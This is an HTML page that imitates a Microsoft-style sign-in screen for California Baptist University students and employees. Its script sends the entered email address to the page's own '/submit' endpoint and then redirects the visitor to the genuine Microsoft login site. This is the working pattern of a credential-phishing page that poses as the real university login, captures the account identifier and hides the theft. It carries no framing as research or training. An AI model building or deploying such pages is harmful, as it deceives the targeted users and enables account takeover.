<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('/background.png');
            background-size: cover;
            background-position: center;
        }

        .login-wrapper {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 440px;
        }

        .login-box {
            background: #fff;
            width: 100%;
            padding: 56px 44px 48px 44px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            height: 48px;
            width: auto;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #666;
            padding: 8px 0;
            font-size: 15px;
            color: #333;
            outline: none;
            background: transparent;
        }

        .input-group input::placeholder {
            color: #888;
        }

        .input-group input:focus {
            border-bottom: 2px solid #0067b8;
        }

        .forgot-link {
            display: inline-block;
            margin: 16px 0 32px 0;
            color: #0067b8;
            font-size: 13px;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .button-row {
            display: flex;
            justify-content: flex-end;
            gap: 8px;
            margin-bottom: 0;
        }

        .btn {
            padding: 8px 20px;
            font-size: 15px;
            cursor: pointer;
            border: 1px solid #8d8d8d;
            font-family: inherit;
        }

        .btn-back {
            background: #f2f2f2;
            color: #1a1a1a;
        }

        .btn-back:hover {
            background: #e5e5e5;
        }

        .btn-next {
            background: #0067b8;
            color: #fff;
            border-color: #0067b8;
        }

        .btn-next:hover {
            background: #005a9e;
        }

        .info-box {
            background: #f2f2f2;
            width: 100%;
            padding: 18px 44px;
            font-size: 13px;
            color: #333;
            line-height: 1.6;
        }

        .sign-in-options {
            background: #fff;
            width: 100%;
            padding: 16px 44px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #333;
            cursor: pointer;
            margin-top: 8px;
        }

        .sign-in-options:hover {
            background: #f5f5f5;
        }

        .sign-in-options svg {
            width: 18px;
            height: 18px;
            color: #555;
        }
    </style>
</head>
<body>
<div class="login-wrapper">
    <div class="login-box">
        <div class="logo">
            <img src="/logo.png" alt="CBU" />
        </div>
        <h1>Sign in</h1>
        <div class="input-group">
            <input type="email" id="email" placeholder="CBUID#@calbaptist.edu" autocomplete="email" autofocus />
        </div>
        <a href="#" class="forgot-link">Can't access your account?</a>
        <div class="button-row">
            <button class="btn btn-back" onclick="history.back()">Back</button>
            <button class="btn btn-next" onclick="handleNext()">Next</button>
        </div>
    </div>
    <div class="info-box">
        Students login with CBUID#@calbaptist.edu.<br>
        Employees login with username@calbaptist.edu.
    </div>
    <div class="sign-in-options">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="7.5" cy="15.5" r="5.5"/>
            <path d="M21 2l-9.6 9.6"/>
            <path d="M15.5 7.5l3 3L21 8l-3-3"/>
        </svg>
        Sign-in options
    </div>
</div>

<script>
    function handleNext() {
        const email = document.getElementById('email').value;
        if (!email) {
            document.getElementById('email').focus();
            return;
        }
        fetch('/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'email=' + encodeURIComponent(email)
        }).then(() => {
            window.location.href = 'https://login.microsoftonline.com';
        });
    }

    document.getElementById('email').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') handleNext();
    });
</script>
</body>
</html>
